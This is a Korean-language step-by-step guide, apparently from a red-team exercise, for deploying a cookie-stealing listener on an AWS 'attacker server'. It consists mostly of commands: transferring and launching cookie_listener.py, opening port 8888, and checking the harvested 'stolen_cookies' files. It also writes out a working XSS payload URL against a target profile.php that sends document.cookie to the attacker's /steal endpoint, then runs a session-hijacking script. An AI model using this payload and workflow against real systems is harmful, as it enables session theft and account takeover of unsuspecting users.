# 공격자 서버 배포 가이드

## 📦 서버 정보

- **공격자 서버 IP**: 3.113.201.239
- **SSH 키**: ~/Downloads/A_team 관련 키
- **사용자**: ec2-user (또는 ubuntu)

---

## 🚀 Step 1: SSH 키 권한 설정

```bash
# 다운로드 폴더에서 SSH 키 찾기
ls ~/Downloads/*team* ~/Downloads/*Team* ~/Downloads/*.pem

# SSH 키 권한 설정 (필수!)
chmod 400 ~/Downloads/YOUR_KEY.pem

# 예시:
chmod 400 ~/Downloads/A_team.pem
```

---

## 📤 Step 2: 파일 전송 (SCP)

### 필수 파일 전송

```bash
# 쿠키 리스너만 전송 (최소 구성)
scp -i ~/Downloads/A_team.pem \
    cookie_listener.py \
    ec2-user@3.113.201.239:~/

# 전체 파일 전송 (권장)
scp -i ~/Downloads/A_team.pem \
    cookie_listener.py \
    deploy_listener.sh \
    advanced_payloads.py \
    payload_generator.py \
    ec2-user@3.113.201.239:~/
```

### 사용자명이 ubuntu인 경우

```bash
scp -i ~/Downloads/A_team.pem \
    cookie_listener.py \
    deploy_listener.sh \
    ubuntu@3.113.201.239:~/
```

---

## 🔌 Step 3: 서버 접속

```bash
# SSH 접속
ssh -i ~/Downloads/A_team.pem ec2-user@3.113.201.239

# 또는
ssh -i ~/Downloads/A_team.pem ubuntu@3.113.201.239
```

---

## 🛠️ Step 4: 서버에서 설정 (최초 1회)

```bash
# Python3 및 pip 설치 확인
python3 --version
pip3 --version

# Flask 설치
pip3 install flask

# 실행 권한 부여
chmod +x cookie_listener.py
chmod +x deploy_listener.sh

# 방화벽 포트 8888 오픈 (필요시)
sudo ufw allow 8888/tcp
sudo ufw status
```

### AWS 보안 그룹 설정 (필수!)

```
AWS Console → EC2 → Security Groups → 해당 인스턴스 보안 그룹

Inbound Rules 추가:
- Type: Custom TCP
- Port: 8888
- Source: 0.0.0.0/0 (또는 특정 IP)
```

---

## 🎯 Step 5: 쿠키 리스너 실행

### 방법 1: 직접 실행 (포그라운드)

```bash
# 서버에서 실행
python3 cookie_listener.py

# 출력:
# 🎯 Cookie Listener Server Started
# 📡 Listening on: http://0.0.0.0:8888
# 🔗 Webhook URL: http://3.113.201.239:8888/steal
```

**종료**: `Ctrl + C`

### 방법 2: 백그라운드 실행 (권장)

```bash
# 백그라운드 실행
nohup python3 cookie_listener.py > listener.log 2>&1 &

# PID 확인
echo $!

# 또는 ps로 확인
ps aux | grep cookie_listener

# 로그 실시간 확인
tail -f listener.log

# 종료 방법
kill $(ps aux | grep cookie_listener.py | grep -v grep | awk '{print $2}')
```

### 방법 3: 자동 배포 스크립트 (가장 쉬움)

```bash
# 자동 배포 스크립트 실행
./deploy_listener.sh

# 스크립트가 자동으로:
# 1. 의존성 확인
# 2. 방화벽 설정
# 3. 쿠키 리스너 시작
```

---

## 🧪 Step 6: 리스너 동작 확인

### 로컬에서 테스트

```bash
# 헬스체크
curl http://3.113.201.239:8888/health

# 예상 응답:
# {"status":"ok","message":"Cookie listener is running"}

# 쿠키 전송 테스트
curl "http://3.113.201.239:8888/steal?c=PHPSESSID=test123"

# 서버 로그 확인 (서버에서)
tail -f listener.log
# 또는
cat stolen_cookies/cookie_*.json
```

---

## 📊 Step 7: 수집된 쿠키 확인

```bash
# 서버에서 실행

# 쿠키 목록 확인
ls -lh stolen_cookies/

# 최신 쿠키 확인
cat stolen_cookies/cookie_*.json | tail -1 | python3 -m json.tool

# 쿠키 개수 확인
ls stolen_cookies/*.json | wc -l

# 웹 인터페이스로 확인
curl http://3.113.201.239:8888/logs | python3 -m json.tool
```

---

## 🔄 전체 프로세스 요약

```bash
# ============================================
# 로컬 PC에서 실행
# ============================================

# 1. 현재 디렉토리로 이동
cd ~/Desktop/Red_basic_local/H/xss우회

# 2. SSH 키 권한 설정
chmod 400 ~/Downloads/A_team.pem

# 3. 파일 전송
scp -i ~/Downloads/A_team.pem \
    cookie_listener.py \
    deploy_listener.sh \
    ec2-user@3.113.201.239:~/

# 4. SSH 접속
ssh -i ~/Downloads/A_team.pem ec2-user@3.113.201.239

# ============================================
# 서버(3.113.201.239)에서 실행
# ============================================

# 5. 의존성 설치 (최초 1회)
pip3 install flask

# 6. 실행 권한 부여
chmod +x cookie_listener.py deploy_listener.sh

# 7. 리스너 시작 (백그라운드)
nohup python3 cookie_listener.py > listener.log 2>&1 &

# 8. 동작 확인
tail -f listener.log

# 9. 쿠키 수집 대기...
# (로컬에서 XSS 공격 실행)

# 10. 수집된 쿠키 확인
ls stolen_cookies/
cat stolen_cookies/cookie_*.json

# ============================================
# 로컬 PC에서 XSS 공격 실행
# ============================================

# 11. 자동 공격 실행
python3 test_advanced.py

# 또는 브라우저에서 직접:
# http://3.34.90.201/profile.php?email=test@test&full_name=%3Cimg/src%3Dx/onerror%3Dfetch%28%22http%3A//3.113.201.239%3A8888/steal%3Fc%3D%22%2Bdocument.cookie%29%3E

# ============================================
# 쿠키 탈취 후 세션 하이재킹
# ============================================

# 12. 탈취한 쿠키 다운로드 (로컬로)
scp -i ~/Downloads/A_team.pem \
    ec2-user@3.113.201.239:~/stolen_cookies/*.json \
    ./stolen_cookies/

# 13. 세션 하이재킹
python3 session_hijacker.py -t http://3.34.90.201/index.php
```

---

## 🚨 문제 해결

### 문제 1: SSH 접속 안됨

```bash
# 키 권한 확인
ls -l ~/Downloads/A_team.pem
# -r-------- 이어야 함

# 권한 재설정
chmod 400 ~/Downloads/A_team.pem

# 상세 로그로 접속 시도
ssh -v -i ~/Downloads/A_team.pem ec2-user@3.113.201.239
```

### 문제 2: 포트 8888 접근 안됨

```bash
# 서버에서 리스너가 실행 중인지 확인
ps aux | grep cookie_listener

# 포트가 열려있는지 확인
netstat -tuln | grep 8888
# 또는
ss -tuln | grep 8888

# 방화벽 확인
sudo ufw status

# AWS 보안 그룹 확인
# AWS Console에서 확인 필요
```

### 문제 3: Flask 설치 안됨

```bash
# pip3 업그레이드
python3 -m pip install --upgrade pip

# Flask 재설치
pip3 install --user flask

# 또는 sudo로 설치
sudo pip3 install flask
```

### 문제 4: 쿠키가 수집되지 않음

```bash
# 리스너 로그 확인
tail -f listener.log

# 포트 접근 테스트 (로컬에서)
curl http://3.113.201.239:8888/health

# XSS 페이로드가 정상 실행되는지 확인
# 브라우저 개발자 도구 → Network 탭
```

---

## 🎯 빠른 시작 (원라인)

```bash
# 로컬에서 실행 (전송 + 접속)
chmod 400 ~/Downloads/A_team.pem && \
scp -i ~/Downloads/A_team.pem cookie_listener.py deploy_listener.sh ec2-user@3.113.201.239:~/ && \
ssh -i ~/Downloads/A_team.pem ec2-user@3.113.201.239

# 서버에서 실행 (설치 + 시작)
pip3 install flask && \
chmod +x cookie_listener.py deploy_listener.sh && \
nohup python3 cookie_listener.py > listener.log 2>&1 & \
tail -f listener.log
```

---

**준비 완료! 이제 XSS 공격을 시작하세요!** 🚀
